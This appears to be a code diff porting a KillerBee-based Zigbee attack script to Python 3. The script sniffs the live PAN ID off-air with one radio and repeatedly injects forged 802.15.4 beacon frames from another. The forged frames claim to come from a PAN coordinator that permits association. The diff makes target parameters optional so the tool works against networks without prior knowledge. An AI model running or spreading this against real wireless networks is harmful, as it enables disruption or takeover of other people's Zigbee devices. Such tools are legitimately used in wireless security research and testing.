@@ -7,6 +7,7 @@ from __future__ import print_function
 #TODO: Reduce the usage of globals
 import signal
 import sys
+import struct
 import argparse
 import threading
 from threading import Event
@@ -18,27 +19,30 @@ from killerbee import *
 
 def create_beacon(panid, coordinator, epanid):
     '''Raw creation of beacon packet.'''
+    # Py3 port: bytes literals + b''.join + struct.pack(...) directly.
+    # (Py2 built this from str literals and str(struct.pack()), which under
+    #  Py3 yields a str and a "b'\\x..'" repr -- both wrong for kb.inject().)
     beacon = [
         # FRAME CONTROL
-        "\x00",  # FCF for beacon 0x00
-        "\x80",  # src addressing mode: short/16-bit 0x0002 (this is the only FCF flag marked)
-        "\xd8",  # Sequence number for 802.15.4 layer
-        str(struct.pack("H", panid)),  # 2-byte shortcode of panid
-        #str(struct.pack("H", coordinator)[0]), # only some implementations make it 0000 "\x00\x00", # Source address 0
-        "\x00\x00",
+        b"\x00",  # FCF for beacon 0x00
+        b"\x80",  # src addressing mode: short/16-bit 0x0002 (this is the only FCF flag marked)
+        b"\xd8",  # Sequence number for 802.15.4 layer
+        struct.pack("<H", panid),  # 2-byte source PAN ID (little-endian, on-air order)
+        #struct.pack("<H", coordinator), # only some implementations make it 0000
+        b"\x00\x00",  # Source address 0
         # SUPERFRAME
-        "\xff\xcf",  # beacon interval, superframe interval, final cap slot, jbattery extension, pan coordinator (true!), association permit (true)
+        b"\xff\xcf",  # beacon interval, superframe interval, final cap slot, jbattery extension, pan coordinator (true!), association permit (true)
         # GTS
-        "\x00",
+        b"\x00",
         # Pending addresses
-        "\x00",
-        # bullshit zigbee layer packet
-        "\x00\x22\x8c",
+        b"\x00",
+        # zigbee layer stub
+        b"\x00\x22\x8c",
         # Extended PAN ID (Zigbee NWK layer)
-        str(struct.pack("L", epanid)),
-        "\xff\xff\xff\x00"
+        struct.pack("<L", epanid),
+        b"\xff\xff\xff\x00"
     ]
-    return ''.join(beacon)
+    return b''.join(beacon)
 
 
 # Thread 1: Sniffs and extracts Source PAN ID
@@ -46,7 +50,7 @@ def get_spanids():
     spanid = threading.spanid
     canidate = 0
     restart_threshold = 0
-    while not continue_execution.isSet():
+    while not continue_execution.is_set():
         try:
             recvpkt = listen.pnext()
         except:
@@ -56,7 +60,7 @@ def get_spanids():
         if recvpkt != None and recvpkt['validcrc']:
             restart_threshold = 0
             try:
-                canidate = struct.unpack('H', recvpkt['bytes'][3:5])[0]
+                canidate = struct.unpack('<H', recvpkt['bytes'][3:5])[0]
             except:
                 print(recvpkt['bytes'][3:5])
                 pass
@@ -80,7 +84,7 @@ def get_spanids():
 
 # Thread 2: Injects beacons
 def inject():
-    while not continue_execution.isSet():
+    while not continue_execution.is_set():
         sleep(args.sleep)  # Added sleep as it seems we were overwhelming USB lib.
         sp = create_beacon(threading.spanid, args.coordinator, args.epanid) 
         #TODO: Is there any need for: args.devleave, args.coordinator, args.device)
@@ -97,18 +101,23 @@ if __name__ == '__main__':
     # Command-line arguments
     parser = argparse.ArgumentParser()
     parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
-    parser.add_argument('-i', '--interface', action='store', dest='devstring')
-    parser.add_argument('-l', '--listen', action='store', dest='listeninterface')
-    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
-    parser.add_argument('-e', '--epanid', help="Extended PAN ID", action='store', required=True, type=tohex)
-    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
+    parser.add_argument('-i', '--interface', action='store', dest='devstring', help="Inject device path, e.g. /dev/ttyACM0")
+    parser.add_argument('-l', '--listen', action='store', dest='listeninterface', help="Sniff device path, e.g. /dev/ttyACM3")
+    parser.add_argument('-d', '--device', action='store', dest='device', default=None,
+                        help="KillerBee hardware driver string for both radios, e.g. feralcat")
+    # -p/-e/-s are seeds only: the sniffer thread learns the live PAN ID off-air,
+    # so they are optional (default 0x0000) rather than required.
+    parser.add_argument('-p', '--panid', action='store', required=False, type=tohex, default=0,
+                        help="Seed target PAN ID (0x....); learned live by the sniffer if omitted")
+    parser.add_argument('-e', '--epanid', help="Extended PAN ID seed", action='store', required=False, type=tohex, default=0)
+    parser.add_argument('-s', '--coordinator', action='store', required=False, type=tohex, default=0)
     parser.add_argument('-w','--sleep', action='store', type=float, required=False, default=0.01)
     #parser.add_argument('--numloops', action='store', default=1, type=int)
     args = parser.parse_args()
 
     # Can't get the device to like context switching between listen and inject, so we have to have a workaround...
-    kb = KillerBee(device=args.devstring)
-    listen = KillerBee(device=args.listeninterface)
+    kb = KillerBee(device=args.devstring, hardware=args.device)
+    listen = KillerBee(device=args.listeninterface, hardware=args.device)
 
     kb.set_channel(args.channel)
     listen.set_channel(args.channel)
@@ -136,7 +145,7 @@ if __name__ == '__main__':
 
     #signal.signal(signal.SIGINT, signal_handler)
 
-    while not continue_execution.isSet():
+    while not continue_execution.is_set():
         try:
             getem2.join(timeout=1)
         except KeyboardInterrupt:
